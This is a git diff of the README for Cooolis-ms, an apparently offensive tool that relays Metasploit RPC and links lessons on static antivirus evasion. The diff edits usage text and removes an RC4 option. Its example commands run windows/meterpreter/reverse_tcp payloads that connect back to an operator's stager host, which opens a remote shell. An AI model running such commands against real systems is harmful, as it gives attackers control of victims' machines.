@@ -22,7 +22,6 @@ Cooolis-ms is a server that supports the Metasploit Framework RPC. It is used to
 - [静态恶意代码逃逸（第四课）](https://payloads.online/archivers/2019-11-10/4)
 - [静态恶意代码逃逸（第五课）](https://payloads.online/archivers/2019-11-10/5)
 
-[![Cooolis](http://img.youtube.com/vi/xMYZbvn53aY/0.jpg)](https://www.youtube.com/embed/xMYZbvn53aY "Cooolis")
 
 ## How to install | 如何安装
 
@@ -58,7 +57,7 @@ $ python3 server.py -U msf -P msf -H 127.0.0.1 -p 55553 -s -v -l 8899 -S 172.16.
 IP : 172.16.143.2
 
 ```
-Windows > ConsoleApplication5.exe -p windows/meterpreter/reverse_tcp -s LHOST=172.16.143.1,LPORT=8876,Format=dll -H 172.16.143.1 -P 8899 -c password
+Windows > Coolis-ms.exe -p windows/meterpreter/reverse_tcp -s LHOST=172.16.143.1,LPORT=8876 -H 172.16.143.1 -P 8899
 ```
 
 ## Cooolis-ms server
@@ -93,13 +92,11 @@ optional arguments:
 ![](./pic/demo.png)
 
 ```
-[*]Usage : Cooolis-ms.exe -p [PAYLOAD] -s [PAYLOAD OPTIONS] -c [RC4 PASSWORD] -H [Stager Host] -P [Stager Port]
+[*]Usage : Cooolis-ms.exe -p [PAYLOAD] -s [PAYLOAD OPTIONS] -H [Stager Host] -P [Stager Port]
          -p [PAYLOAD]    MSF PAYLOAD TYPE
          -s [PAYLOAD OPTIONS]    MSF PAYLOAD OPTIONS
-         -c [RC4 PASSWORD]       Startup RC4 Trans Stager
          -H [Stager Host]        Cooolis-Server Host
          -P [Stager Port]        Cooolis-Server Port
-         -D [Default]
 [*]Example : Cooolis-ms.exe -p windows/meterpreter/reverse_tcp -s LHOST=192.168.1.1,LPORT=1122 -H 192.168.2.1 -P 4444
 ```
 
